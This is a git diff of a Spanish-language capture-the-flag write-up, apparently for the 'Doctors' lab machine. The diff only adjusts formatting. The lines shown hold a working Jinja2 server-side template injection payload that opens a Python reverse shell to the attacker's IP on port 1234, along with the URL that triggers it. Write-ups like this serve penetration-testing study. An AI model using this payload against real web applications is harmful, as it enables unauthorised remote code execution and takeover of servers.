@@ -88,8 +88,9 @@ En este caso el payload va a ser una reverse shell en python, ya que el backend 
 
 En este caso nuestro payload sera el siguiente:
 
-```python
+```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<tuIP>\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
 ```
 
 Una vez creemos el post nuevo accederemos a http://doctors.htb/archive recibiremos nuestra reverse en el puerto 1234.
